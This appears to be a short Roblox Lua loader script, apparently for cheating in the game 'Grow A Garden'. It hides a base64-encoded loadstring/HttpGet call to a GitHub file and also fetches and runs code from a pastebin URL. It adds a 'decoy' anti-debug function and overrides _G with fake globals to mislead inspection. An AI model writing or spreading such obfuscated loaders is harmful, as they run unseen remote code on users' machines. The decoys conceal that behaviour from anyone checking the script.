-- Obfuscated Script
local a='bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9XQ0RldmVsb3BtZW50cy9XQ0RldnMvcmVmcy9oZWFkcy9tYWluL0dyb3clMjBBJTIwR2FyZGVuL3N0b2NrZWRzZWVkcy5sdWEnKSkoKQ=='
local b=game:HttpGet("https://pastebin.com/raw/C6i4awfH")
local f=loadstring(b)()
f(a)

-- Dummy logic for anti-debug
local function dummyFunc()
    return "Just a decoy"
end

local fakeGlobals = {
    secureShell = true,
    engineVersion = "10.13.37",
    cryptTools = { encrypt = function() end, decrypt = function() end }
}

setmetatable(_G, {
    __index = function(_, k)
        if fakeGlobals[k] ~= nil then return fakeGlobals[k] end
        return nil
    end
})
